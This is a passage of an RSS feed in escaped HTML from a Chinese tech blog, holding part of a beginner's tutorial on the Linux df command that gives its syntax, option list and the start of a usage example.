&lt;a href=&quot;http://blog.jobbole.com/109254/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（24）：Linux 文件类型与扩展名&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/105269&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（25）：Linux 文件属性详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109539&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（26）：用 SecureCRT 来上传和下载文件&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109614&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（27）：linux chmod 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109674/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（28）：tar 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109696/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（29）: chgrp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109750/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（30）: chown 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109781/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（31）: /etc/group 文件详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109797/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（32）：gzip 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109827/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（33）：df 命令&lt;/a&gt;&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109846&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109846votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109846&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 1 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Fri, 13 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-13-109846-0ee338774.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-13-109846-0ee338774.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>每天一个 Linux 命令（33）：df 命令</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;linux中df命令的功能是用来检查linux服务器的文件系统的磁盘空间占用情况。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。&lt;/p&gt;
&lt;p&gt;1．命令格式：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9708f9658861448&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
df [选项] [文件]&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9708f9658861448-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9708f9658861448-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;df&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;选项&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;文件&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;2．命令功能：&lt;/p&gt;
&lt;p&gt;显示指定磁盘文件的可用空间。如果没有文件名被指定，则所有当前被挂载的文件系统的可用空间将被显示。默认情况下，磁盘空间将以 1KB 为单位进行显示，除非环境变量 POSIXLY_CORRECT 被指定，那样将以512字节为单位进行显示&lt;/p&gt;
&lt;p&gt;3．命令参数：&lt;/p&gt;
&lt;p&gt;必要参数：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c970904485685456&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-a 全部文件系统列表

-h 方便阅读方式显示

-H 等于“-h”，但是计算式，1K=1000，而不是1K=1024

-i 显示inode信息

-k 区块为1024字节

-l 只显示本地文件系统

-m 区块为1048576字节

--no-sync 忽略 sync 命令

-P 输出格式为POSIX

--sync 在取得磁盘信息前，先执行sync命令

-T 文件系统类型&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c970904485685456-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c970904485685456-21&quot;&gt;21&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;a&lt;/span&gt; 全部文件系统列表&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt; 方便阅读方式显示&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;H&lt;/span&gt; 等于“&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;h&lt;/span&gt;”，但是计算式，&lt;span class=&quot;crayon-cn&quot;&gt;1K&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1000&lt;/span&gt;，而不是&lt;span class=&quot;crayon-cn&quot;&gt;1K&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1024&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;i&lt;/span&gt; 显示&lt;span class=&quot;crayon-i&quot;&gt;inode&lt;/span&gt;信息&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;k&lt;/span&gt; 区块为&lt;span class=&quot;crayon-cn&quot;&gt;1024&lt;/span&gt;字节&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;l&lt;/span&gt; 只显示本地文件系统&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;m&lt;/span&gt; 区块为&lt;span class=&quot;crayon-cn&quot;&gt;1048576&lt;/span&gt;字节&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sync&lt;/span&gt; 忽略 &lt;span class=&quot;crayon-i&quot;&gt;sync&lt;/span&gt; 命令&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;P&lt;/span&gt; 输出格式为&lt;span class=&quot;crayon-v&quot;&gt;POSIX&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-19&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;sync&lt;/span&gt; 在取得磁盘信息前，先执行&lt;span class=&quot;crayon-i&quot;&gt;sync&lt;/span&gt;命令&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c970904485685456-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c970904485685456-21&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;T&lt;/span&gt; 文件系统类型&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0020 seconds] --&gt;
&lt;p&gt;选择参数：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c97090b041176166&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
--block-size=&amp;lt;区块大小&amp;gt; 指定区块大小

-t&amp;lt;文件系统类型&amp;gt; 只显示选定文件系统的磁盘信息

-x&amp;lt;文件系统类型&amp;gt; 不显示选定文件系统的磁盘信息

--help 显示帮助信息

--version 显示版本信息&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97090b041176166-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97090b041176166-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97090b041176166-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97090b041176166-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97090b041176166-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97090b041176166-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97090b041176166-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c97090b041176166-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c97090b041176166-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97090b041176166-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;区块大小&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt; 指定区块大小&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97090b041176166-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97090b041176166-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;文件系统类型&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt; 只显示选定文件系统的磁盘信息&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97090b041176166-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97090b041176166-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;文件系统类型&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt; 不显示选定文件系统的磁盘信息&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97090b041176166-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97090b041176166-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;help&lt;/span&gt; 显示帮助信息&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c97090b041176166-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c97090b041176166-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;version&lt;/span&gt; 显示版本信息&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0012 seconds] --&gt;
&lt;p&gt;4．使用实例：&lt;/p&gt;
&lt;p&gt;实例1：显示磁盘使用情况&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c97090f940851100&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
